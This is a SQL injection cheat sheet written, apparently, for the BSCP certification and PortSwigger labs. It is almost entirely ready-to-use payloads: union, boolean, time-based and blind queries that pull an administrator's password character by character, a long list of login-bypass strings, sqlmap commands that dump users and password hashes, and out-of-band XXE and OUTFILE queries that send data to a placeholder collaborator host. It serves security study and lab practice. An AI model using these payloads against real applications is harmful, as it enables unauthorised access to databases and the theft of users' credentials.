# SQL INJECTION CHEATSHEET + LABS

## Index
- [Key Terms](#key-terms)
- [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
- [Database Version](#database-type-version)
- [Database Content](#database-content)
- [Union Based](#union-based)
- [Boolean Based](#boolean-based)
- [Time Based](#time-based)
- [Blind Based](#blind-based)
- [Out-of-Band](#out-of-band)
- [Bypassing SQL Syntax](#bypassing-sql-sintax)
- [WAF Auth Bypass](#waf-auth-bypass)
- [SQL Map](#sql-map)

---

## Key Terms

    - ERROR BASED -> Uses database errors to infer data

    - BOOLEAN BASED -> Infers data via true/false responses

    - TIME BASED -> Infers data by measuring query execution delay

    - OUT-OF-BAND BASED -> Exfiltrates data via DNS, HTTP, or file requests

    - SQL MAP -> Automates SQLi testing and exploitation

    - DUAL -> Oracle single-row table for SELECT without real tables

---

## Walkthrough - Most Important Labs

- [1]()
- [2]()
- [3]()

---

## Cheat Sheet

> ❗SQL Injection has an endless variety of payloads, bypasses, and techniques. This is my cheatsheet applied to the   BSCP, but in this case I recommend checking out the payloads from [payloads-all-the-things-sqli](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) and [portswigger-sqli](https://portswigger.net/web-security/sql-injection/cheat-sheet)

<br>

#### DATABAE-TYPE-VERSION
``` sql
SELECT version()  --> PostgreSQL 
SELECT @@version  --> Microsoft, MySQL
SELECT * FROM v$version  --> Oracle  
SELECT BANNER FROM v$version --> Oracle
```

#### DATABASE CONTENT
```sql
--- ORACLE (no information schema)
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = '<table-name>'

--- PostgreSQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'

--- MySQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'

--- Microsoft
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'


SELECT schema_name from information_schema.schemata
SELECT table_name from information_schema.table where table_schema='foo' --
SELECT column_name from information_schema.columns where table_schema='foo' and table_name='bar' -- 
SELECT 1,group_concat(User,0x3a,Password),3 from mysql.user --

```
#### UNION BASED
```sql
' UNION SELECT NULL,NULL,NULL --  null is used because it must return the same data type
' UNION SELECT 1,2,3 --
' UNION SELECT 'foo',null,null -- check in which column we can inject a string
' UNION SELECT 'foo' || ':' || 'bar',null -- display multiple values in the same column
' UNION SELECT 'foo' ||  '0x3a' || 'bar',null  
' UNION SELECT group_concat(foo,bar),null --
```

#### BOOLEAN BASED
```sql
http://example.com/item?id=1 AND 1=1 -- except normal req
http://example.com/item?id=1 AND 1=2 -- except error 
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- expect no error
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- expect error
```

#### TIME BASED
```sql
pg_sleep(10) --> PostgreSQL
dbms_pipe.receive_message(('a'),10) --> Oracle
DBMS_LOCK.SLEEP(10 --> Oracle
WAITFOR DELAY '0:0:10' --> Microsoft
SLEEP(10)  --> MySQL

```

#### BLIND BASED
```sql
-- oracle --
foo'||(select '' from dual)||'  -- no error
foo'||(select '' from noexisto)||'  -- error
foo'||(select '' from users where rownum= 1)||' -- no error? table user exists

(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) --  true -> error
(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) -- false -> no error
(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') -- true/false -> /error/noerror 
(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')
(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')

AND 1=CAST((SELECT username FROM users ROWNUM 1) AS int)--

SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--

```

#### OUT-OF-BAND
```sql
-- SQLI + XXE -> CHECK DNS CALLBACK
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;

-- SQLI + XXE OOB -> EXTRACT DATA --
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<OOB_URL_CONCAT_EXPRESSION>)||'.<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;

-- OOB -> READ FILES 
SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');

-- OOB -> WRITE FILES 
SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
```

#### BYPASSING-SQL-SINTAX
```sql
-- BYPASSIN  EQUALS --

-- MySQL/SQL Server e.g -> SUBSTRING(username,1,1)='a' 
SUBSTRING(username,1,1)LIKE 'a' --> burp intruder
SUBSTRING(username,1,1)IN 'a' 'b' 'c' ...
SUBSTRING(VERSION(),1,1) BETWEEN 1 AND 3 -- 2
-- ORACLE e.g -> SUBSTR(username, 1, 1) = 'a'
SUBSTR(username, 1, 1) LIKE 'a' --> burp intruder
SUBSTR(username, 1, 1) IN ('a', 'b', 'c', ...)
SUBSTR(VERSION(), 1, 1) BETWEEN '1' AND '3' -- 2 

-- BYPASS KEYWORDS
AND   --> and , aNd , && 
OR    --> || 
=     --> LIKE , REGEXP , BETWEEN
>     --> NOT BETWEEN O AND X
WHERE --> HAVING

```

#### WAF-AUTH-BYPASS
```sql
administrator' --
administrator' #
administrator'/*
administrator' or '1'='1
administrator' or '1'='1'--
administrator' or '1'='1'#
administrator' or '1'='1'/*
administrator'or 1=1 or ''='
administrator' or 1=1
administrator' or 1=1--
administrator' or 1=1#
administrator' or 1=1/*
administrator') or ('1'='1
administrator') or ('1'='1'--
administrator') or ('1'='1'#
administrator') or ('1'='1'/*
administrator') or '1'='1
administrator') or '1'='1'--
administrator') or '1'='1'#
administrator') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'administrator', '81dc9bdb52d04dc20036dbd8313ed055
administrator" --
administrator" #
administrator"/*
administrator" or "1"="1
administrator" or "1"="1"--
administrator" or "1"="1"#
administrator" or "1"="1"/*
administrator"or 1=1 or ""="
administrator" or 1=1
administrator" or 1=1--
administrator" or 1=1#
administrator" or 1=1/*
administrator") or ("1"="1
administrator") or ("1"="1"--
administrator") or ("1"="1"#
administrator") or ("1"="1"/*
administrator") or "1"="1
administrator") or "1"="1"--
administrator") or "1"="1"#
administrator") or "1"="1"/*
1' or 1.e(1) or '1'='1
1234 " AND 1=0 UNION ALL SELECT "administrator", "81dc9bdb52d04dc20036dbd8313ed055
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*

```

#### SQL MAP
``` 
sqlmap -r <REQUEST-FROM-BURP>

sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs

```





